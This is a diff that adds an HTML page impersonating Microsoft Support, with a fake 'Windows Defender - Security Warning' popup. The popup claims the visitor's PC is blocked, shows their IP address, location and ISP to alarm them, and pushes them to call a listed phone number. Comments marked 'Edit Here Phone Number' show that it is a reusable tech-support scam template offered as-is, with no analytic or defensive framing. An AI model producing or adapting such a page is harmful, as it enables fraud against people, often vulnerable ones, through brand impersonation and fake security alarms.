@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Support</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+</head>
+<body>
+
+    <!-- Header with Microsoft Logo and Menu -->
+    <header>
+        <div class="header-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+            <h1>Microsoft Support</h1>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#">Products</a></li>
+                <li><a href="#">Support</a></li>
+                <li><a href="#">Contact Us</a></li>
+                <li><a href="#">FAQ</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <h2>Welcome to Microsoft Support</h2>
+        <p>Your trusted source for Microsoft products and services. For any assistance, please reach out to us using the contact details provided.</p>
+    </main>
+
+    <!-- Popup Container -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+                <span class="title">Windows Defender - Security Warning</span>
+            </div>
+            <hr>
+            <div class="popup-body">
+                <h3>⚠️ Windows Defender Security Center</h3>
+                <p class="alert-details">
+                    Address IP: <span id="visitor-ip" class="red-text">Loading...</span><br>
+                    Date: <span id="current-date" class="red-text"></span><br>
+                    Location: <span id="location" class="red-text">Fetching...</span><br>
+                    ISP: <span id="isp" class="red-text">Fetching...</span>
+                </p>
+                <p class="alert-message">
+                    Access to this PC has been blocked for security reasons.
+                </p>
+                <p class="support-text">
+				<!-- Edit Here Phone Number-->
+				
+                    Call Windows Support: <span class="phone-number">+1 845 319 7799</span>
+                </p>
+            </div>
+            <div class="popup-buttons">
+			<!-- Edit Here Phone Number-->
+                <button onclick="alert('Connecting to support +1 845 319 7799 ')">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2024 Microsoft Corporation. All rights reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+    </footer>
+</body>
+</html>
